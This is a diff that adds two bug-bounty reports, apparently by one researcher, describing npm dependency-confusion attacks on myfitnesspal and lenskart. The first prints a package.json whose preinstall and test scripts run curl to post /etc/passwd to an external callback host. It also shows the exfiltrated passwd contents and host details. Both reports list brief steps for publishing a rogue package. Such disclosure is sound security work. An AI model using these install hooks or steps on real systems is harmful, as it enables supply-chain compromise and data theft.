@@ -1,0 +1,206 @@
+## Report details -
+
+**Type**: Bug
+**Target Location**: [https://myfitnesspal.com](https://myfitnesspal.com)
+**Attack-Type**: Remote Code Execution (RCE)
+**Severity:** High
+**Bug**: NPM Packages Dependency Confusion Attack
+**Vulnerable Package**: Packages: mfp-test-repo
+**URL**: [https://github.com/myfitnesspal/mfp-test-repo/blob/233d20d9d6656154b79ee805cbe0ba69ea038470/package.json#L2](https://github.com/myfitnesspal/mfp-test-repo/blob/233d20d9d6656154b79ee805cbe0ba69ea038470/package.json#L2)
+
+## Summary:
+Hi team I am Shiv Pratap Singh,
+While dorking on github I found a code section where **package.json** file was getting publicly disclosed, with a private package "puppeteer-example"
+which can be leveraged to get RCE.
+
+To show impact i got `/etc/passwd` file from the server.
+Here is the content:
+
+`
+root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinsshd:x:105:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinclamav:x:106:112::/var/lib/clamav:/bin/false
+`
+I got some more information:
+```
+{
+  "p": "puppeteer-example",
+  "c": "/o3F6B030/node_modules/puppeteer-example",
+  "hd": "/home/o3F6B030",
+  "hn": "instance",
+  "un": "o3F6B030",
+  "dns": [
+    "8.8.8.8"
+  ],
+  "v": "0.1.2",
+  "pjson": {
+    "name": "puppeteer-example",
+    "version": "0.1.2",
+    "description": "testing for dependency confusion",
+    "main": "index.js",
+    "scripts": {
+      "test": "/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun",
+      "preinstall": "/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun"
+    },
+    "author": "Shiv Pratap Singh",
+    "license": "ISC"
+  },
+  "arch": "x64",
+  "type": "Linux",
+  "version": "#45~20.04.1-Ubuntu SMP Tue Jul 11 19:08:13 UTC 2023",
+  "interface": {
+    "lo": [
+      {
+        "address": "127.0.0.1",
+        "netmask": "255.0.0.0",
+        "family": "IPv4",
+        "mac": "00:00:00:00:00:00",
+        "internal": true,
+        "cidr": "127.0.0.1/8"
+      }
+    ],
+    "eth0": [
+      {
+        "address": "172.17.0.2",
+        "netmask": "255.255.0.0",
+        "family": "IPv4",
+        "mac": "02:42:ac:11:00:02",
+        "internal": false,
+        "cidr": "172.17.0.2/16"
+      }
+    ]
+  }
+}
+```
+This includes:
+OS version
+OS type
+OS arch
+hostname
+username
+homedir
+
+
+
+## Description -
+
+The npm package dependency confusion attack is a critical vulnerability that can lead to unauthorized code execution within a software ecosystem. This attack occurs when an attacker takes advantage of the discrepancy between a public package registry and an internal or private package registry used by an organization. By manipulating the package naming convention and leveraging the package manager's default behavior, the attacker can trick the build process into downloading a malicious package from a public registry instead of the intended package from the internal registry. This can result in the execution of unauthorized code within the target environment.
+
+## Steps To Reproduce -
+
+1. Find npm vulnerable packages using google dorking, github dorking and some automation
+2. After finding these packages
+3. Add RCE code, just to notify me
+4. Upload in https://npmjs.com
+
+If you are unable to understand my report here are some best reference: -
+
+[https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
+[https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/](https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/)
+[https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013](https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013)
+
+## Impact:
+
+If these packages had been claimed by an attacker, this would have led to arbitrary code execution on the affected server, as well as allowing the attacker to add backdoors inside the affected project(s) during the build process.
+
+Remote Code Execution (RCE): The attacker can inject malicious code into the target system, leading to unauthorized access, data theft, system compromise, or further exploitation of the system.
+
+Supply Chain Compromise: By introducing malicious code through the dependency confusion attack, the attacker can compromise the software supply chain and distribute infected packages to other systems or organizations unknowingly.
+
+## Proof of concept(POC) -
+Check the below video:
+[dependency_Confusion_myfitness_POC.mkv](https://bugcrowd.com/myfitnesspal-mbb/submissions/2c4cda67-1b59-4e11-be80-e5bb16fdd643/attachments/5c832bbd-3905-4e28-b456-299c6b9e7d4b "dependency_Confusion_myfitness_POC.mkv")
+
+## More Reference:
+
+[https://www.youtube.com/watch?v=P13xrz0EgNw](https://www.youtube.com/watch?v=P13xrz0EgNw)
+[https://www.youtube.com/watch?v=4ggqsJeSu04](https://www.youtube.com/watch?v=4ggqsJeSu04)
+[https://www.youtube.com/watch?v=zFHJwehpBrU](https://www.youtube.com/watch?v=zFHJwehpBrU)
+[https://redhuntlabs.com/blog/dependency-confusion-attack-what-why-and-how/](https://redhuntlabs.com/blog/dependency-confusion-attack-what-why-and-how/)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Report details -
+Type: Vulnerability
+Target Location: https://admin.lenskart.com/
+Attack-Type: Remote Code Execution (RCE)
+Severity: Critical
+Bug: NPM Packages Dependency Confusion Attack
+Vulnerable Package: lenskart
+URL: https://admin.lenskart.com/package.json
+
+Summary:
+Hi team I am Shiv Pratap Singh,
+While testing on admin.lenskart.com I found package.json file was getting publicly disclosed, consisting of a private package, name: "lenskart" which I leveraged to get RCE.
+I found the package here https://admin.lenskart.com/package.json 
+
+Getting RCE on an admin subdomain is way too risky to even think.
+
+Description -
+
+The npm package dependency confusion attack is a critical vulnerability that can lead to unauthorized code execution within a software ecosystem. This attack occurs when an attacker takes advantage of the discrepancy between a public package registry and an internal or private package registry used by an organization. By manipulating the package naming convention and leveraging the package manager's default behavior, the attacker can trick the build process into downloading a malicious package from a public registry instead of the intended package from the internal registry. This can result in the execution of unauthorized code within the target environment.
+
+Steps To Reproduce -
+
+1. Find npm vulnerable packages (private packages not registered on NPM).
+2. Add RCE code, just to notify me3. Make an account on https://npmjs.com
+2. Publish it to https://npmjs.com
+
+If you are unable to understand my report here are some best reference: -
+
+https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+https://dhiyaneshgeek.github.io/web/security/2021/09/04/dependency-confusion/
+https://systemweakness.com/rce-via-dependency-confusion-e0ed2a127013
+
+Impact:
+
+When an attacker gains Remote Code Execution (RCE) on the admin subdomain of a website, the impact can be severe, potentially leading to significant security breaches and damage. Here are five potential actions an attacker can take:
+
+Data Theft:
+The attacker can access and exfiltrate sensitive user data, including personal information, financial records, or confidential documents stored on the admin subdomain.
+Unauthorized Access:
+With RCE, the attacker can infiltrate administrative panels and control various aspects of the website, such as user accounts, content management systems, and server configurations.
+Malware Injection:
+The attacker can inject malicious code or malware into the website, compromising the security of visitors and potentially spreading malware to a broader audience.
+
+Credential Theft:
+Attackers can steal administrative credentials, gaining long-term access to the website. This allows them to carry out further attacks, manipulate content, and maintain persistence.
+Server Takeover:
+RCE on the admin subdomain can extend to a complete server takeover, enabling the attacker to control the entire server infrastructure, disrupt services, and host malicious content or launch additional attacks.
+These actions underline the critical importance of robust security measures, such as regularly updating and patching software, implementing strong access controls, and monitoring for suspicious activities to mitigate the risks associated with RCE vulnerabilities.
+
+Proof of concept(POC) -
+Check the attached POC video.I have made the video unlisted, only people with link catch watch.
+https://youtu.be/I-SiaxIiMaQ
+
+More Reference:
+
+https://www.youtube.com/watch?v=P13xrz0EgNw
+https://www.youtube.com/watch?v=4ggqsJeSu04
+https://www.youtube.com/watch?v=zFHJwehpBrU
+https://redhuntlabs.com/blog/dependency-confusion-attack-what-why-and-how/
